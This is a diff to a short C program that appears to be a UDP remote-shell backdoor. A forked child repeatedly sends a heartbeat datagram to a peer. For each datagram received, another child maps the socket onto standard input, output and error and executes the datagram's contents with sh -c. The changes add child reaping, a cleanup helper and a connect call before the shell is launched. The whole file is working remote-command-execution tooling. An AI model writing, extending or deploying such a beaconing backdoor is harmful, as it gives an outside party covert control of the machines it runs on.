@@ -23,6 +23,7 @@
 #include <errno.h>
 #include <string.h>
 #include <signal.h>
+#include <sys/wait.h>
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
@@ -32,18 +33,27 @@
 static int sockfd, cpid1, cpid2;
 static struct addrinfo *dstinfo, *srcinfo;
 
-void clean_and_exit(char *e) {
+void clean() {
   if (dstinfo)
     freeaddrinfo(dstinfo);
   if (srcinfo)
     freeaddrinfo(srcinfo);
+  close(sockfd);
+}
+
+void clean_and_exit(char *e) {
+  clean();
   if (cpid1 > 0)
     kill(cpid1, SIGKILL);
   if (cpid2 > 0)
     kill(cpid2, SIGKILL);
-  close(sockfd);
   perror(e);
   exit(1);
+}
+
+void catch_child(int sig_num) {
+    int child_status;
+    wait(&child_status);
 }
 
 int main(int argc, char *argv[]) {
@@ -88,10 +98,14 @@ int main(int argc, char *argv[]) {
   if ((ret = bind(sockfd, srcinfo->ai_addr, srcinfo->ai_addrlen)) != 0)
     clean_and_exit("bind");
 
+  // catch signals to free resources
+  signal(SIGCHLD, catch_child);
+
   // fork heartbeat
-  if ((cpid1 = fork()) < 0)
+  switch ((cpid1 = fork())) {
+  case -1:
     clean_and_exit("fork");
-  if (cpid1 == 0) {
+  case 0:
     while (1) {
       sendto(sockfd, HEARTBEAT, sizeof(HEARTBEAT), 0,
              p->ai_addr, p->ai_addrlen);
@@ -105,14 +119,22 @@ int main(int argc, char *argv[]) {
                         p->ai_addr, &p->ai_addrlen)) < 0)
       continue;
 
-    if ((cpid2 = fork()) < 0) {
-      send(sockfd, "error: command not executed\n", 28, 0);
-    } else if (cpid2 == 0) {
+    switch ((cpid2 = fork())) {
+    case -1:
+      sendto(sockfd, "error: command not executed\n", 28, 0,
+             p->ai_addr, p->ai_addrlen);
+      break;
+    case 0:
+      if ((ret = connect(sockfd, p->ai_addr, p->ai_addrlen)) != 0) {
+        sendto(sockfd, "error: command not executed\n", 28, 0,
+               p->ai_addr, p->ai_addrlen);
+        clean();
+        return -1;
+      }
       dup2(sockfd, 0);
       dup2(sockfd, 1);
       dup2(sockfd, 2);
       execl(TARGET_SHELL, "sh", "-c", buffer, NULL);
-      return 0;
     }
   }
 
